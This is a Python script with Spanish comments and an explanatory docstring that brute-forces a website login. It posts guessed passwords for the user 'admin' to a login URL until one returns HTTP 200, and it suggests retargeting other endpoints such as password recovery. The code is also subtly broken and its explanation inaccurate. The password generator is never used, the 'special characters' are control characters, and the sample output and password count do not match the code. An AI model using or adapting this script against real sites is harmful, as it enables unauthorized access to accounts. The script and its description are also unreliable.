import random
import requests

def generate_password(length, include_special_chars=False):
  """Genera una contraseña aleatoria de la longitud especificada.

  Args:
    length: La longitud de la contraseña.
    include_special_chars: Si `True`, la contraseña puede incluir caracteres especiales.

  Returns:
    Una contraseña aleatoria.
  """

  chars = "abcdefghijklmnopqrstuvwxyz0123456789"
  if include_special_chars:
    chars += "!@#$%^&*()-_=+[]{};:'\"<>,./?"

  password = ""
  for _ in range(length):
    password += chars[random.randint(0, len(chars) - 1)]

  return password

def main():
  """Ejecuta el script."""

  # Lista de contraseñas a probar.
  passwords = []

  # Generamos las contraseñas numéricas.
  for i in range(10):
    passwords.append(str(i))

  # Generamos las contraseñas con letras minúsculas.
  for i in range(26):
    passwords.append(chr(ord("a") + i))

  # Generamos las contraseñas con letras mayúsculas.
  for i in range(26):
    passwords.append(chr(ord("A") + i))

  # Generamos las contraseñas con caracteres especiales.
  for i in range(32):
    passwords.append(chr(i))

  # Probamos cada contraseña.
  for password in passwords:
    # Conectamos a la web.
    url = "https://tu-web.com/login"
    data = {"username": "admin", "password": password}
    response = requests.post(url, data=data)

    # Comprobamos si la contraseña es correcta.
    if response.status_code == 200:
      print("Contraseña encontrada:", password)
      break

if __name__ == "__main__":
  main()


"""Ejecuta el script."""
"""Este script funciona de la siguiente manera:

La función main() se conecta a tu web y envía una solicitud POST al endpoint de inicio de sesión.
El cuerpo de la solicitud POST contiene el nombre de usuario admin y la contraseña que se está probando.
El script comprueba el código de estado de la respuesta. Si es 200, significa que la contraseña es correcta y el script se detiene.
Para personalizar el script, puedes modificar la función generate_password() para generar contraseñas de una longitud o composición diferente. Por ejemplo, puedes añadir la posibilidad de generar contraseñas con números, letras y caracteres especiales.

También puedes modificar la función main() para conectarte a un endpoint diferente de tu web. Por ejemplo, puedes conectarte al endpoint de recuperación de contraseña.

Aquí tienes un ejemplo de cómo utilizar el script:

$ python password_cracker.py
0
1
...
9
a
b
...
z
!
@
...
Este ejemplo genera una lista de 100 contraseñas, 10 numéricas, 26 minúsculas, 26 mayúsculas y 32 con caracteres especiales."""
